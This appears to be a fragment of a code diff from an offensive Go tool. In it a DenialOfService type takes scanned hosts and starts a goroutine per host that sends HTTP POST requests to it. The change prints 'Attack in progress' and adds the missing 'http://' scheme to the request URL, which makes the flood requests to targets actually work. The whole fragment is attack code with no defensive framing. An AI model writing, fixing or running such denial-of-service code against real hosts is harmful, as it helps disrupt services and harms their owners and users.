@@ -25,7 +25,7 @@ func (dos *DenialOfService) Attack(results <-chan *scanner.Result) {
 		select {
 		case res, more := <-results:
 			if more {
-				// color.Green("Attack complete")
+				fmt.Println("Attack in progress")
 				go attack(res)
 			}
 			return
@@ -34,7 +34,7 @@ func (dos *DenialOfService) Attack(results <-chan *scanner.Result) {
 }
 
 func attack(res *scanner.Result) {
-	req, err := http.NewRequest("POST", fmt.Sprintf("%s:%d", res.Addr, res.PortScan.Port), nil)
+	req, err := http.NewRequest("POST", fmt.Sprintf("http://%s:%d", res.Addr, res.PortScan.Port), nil)
 	if err != nil {
 		panic(err)
 	}
